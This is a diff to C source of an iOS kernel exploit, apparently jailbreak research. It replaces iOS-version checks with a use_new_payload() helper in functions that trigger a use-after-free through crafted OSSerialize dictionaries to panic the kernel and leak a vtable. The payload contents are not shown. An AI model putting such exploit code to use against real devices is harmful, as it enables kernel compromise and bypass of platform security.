@@ -5,8 +5,8 @@
 #include <IOKit/IOKitLib.h>     // IO*, io_*
 
 #include "common.h"             // DEBUG
-#include "device.h"             // V_*, get_os_version
 #include "io.h"                 // kOS*, dict_parse, _io_*
+#include "offsets.h"            // use_new_payload
 #include "slide.h"              // get_kernel_anchor
 #include "try.h"                // THROW, TRY, RETHROW
 
@@ -73,7 +73,7 @@ void uaf_with_vtab(addr_t addr)
 
     DEBUG("Triggering panic!");
 
-    if(get_os_version() >= V_13C75) // 9.2
+    if(use_new_payload())
     {
         uint32_t dict_92[] =
         {
@@ -249,7 +249,7 @@ void uaf_panic_leak_vtab(void)
             dict_pad[2 + i * 4 + 2] |= kOSSerializeEndCollection;
         }
     }
-    if(get_os_version() >= V_13C75) // 9.2
+    if(use_new_payload())
     {
         PRINT_BUF("dict_92", dict_92, sizeof(dict_92));
     }
@@ -311,7 +311,7 @@ void uaf_panic_leak_vtab(void)
         // Async cleanup & allow SSH/syslog to deliver latest output
         sleep(3);
 
-        if(get_os_version() >= V_13C75) // 9.2
+        if(use_new_payload())
         {
             dict_parse(dict_92, sizeof(dict_92));
         }
